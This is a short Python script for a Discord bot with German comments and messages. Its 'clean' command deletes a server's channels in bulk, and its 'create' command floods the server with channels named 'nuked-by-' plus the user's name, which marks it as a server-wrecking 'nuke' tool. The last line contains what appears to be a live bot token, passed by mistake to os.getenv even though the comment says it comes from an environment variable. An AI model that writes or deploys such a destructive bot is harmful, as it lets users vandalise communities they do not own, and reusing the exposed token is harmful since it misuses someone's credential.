import discord
from discord.ext import commands
import os

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True  # Wichtig für Interaktionen mit Nachrichten

bot = commands.Bot(command_prefix="/", intents=intents)

@bot.event
async def on_ready():
    print(f"Bot {bot.user.name} ist bereit!")

@bot.command()
async def clean(ctx, count: int):
    channels = ctx.guild.channels
    deleted_channels = 0
    for channel in channels:
        if deleted_channels >= count:
            break
        try:
            await channel.delete()
            deleted_channels += 1
        except Exception as e:
            print(f"Fehler beim Löschen: {e}")
    if deleted_channels > 0:
        await ctx.send(f"{deleted_channels} Kanäle wurden gelöscht.")
    else:
        await ctx.send("Keine Kanäle wurden gelöscht. Überprüfe die Anzahl oder die Berechtigungen!")

@bot.command()
async def create(ctx):
    for i in range(20):
        try:
            await ctx.guild.create_text_channel(f"nuked-by-{ctx.author.name}")
        except Exception as e:
            print(f"Fehler beim Erstellen: {e}")
    await ctx.send("20 Kanäle wurden erfolgreich erstellt!")

# Token aus einer Umgebungsvariable laden
bot.run(os.getenv("MTM0OTA3MTY5NjYzNTc2MDc2MA.GjTvdK.wbg3k4IEuQsCWus_-MuYcnmzm83NOGbLPvj5KU"))
